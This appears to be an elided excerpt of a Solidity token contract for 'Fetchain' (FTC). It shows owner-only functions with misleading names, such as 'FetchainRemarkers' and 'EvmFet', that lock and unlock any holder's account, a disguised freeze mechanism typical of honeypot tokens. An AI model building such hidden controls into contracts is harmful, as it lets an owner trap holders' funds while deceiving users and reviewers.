...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Fetchain Blockchain';
    string constant public symbol = 'FTC';
    ...
    function FetchainRemarkers(address account) public onlyOwner {
        _locked[account] = true;
    }

    function EvmFet(address account) public onlyOwner {
        _locked[account] = false;
    }
    
    
    function FetchainStatics(address account) public view returns (bool) {
...
contract Fetchain is BaseToken {
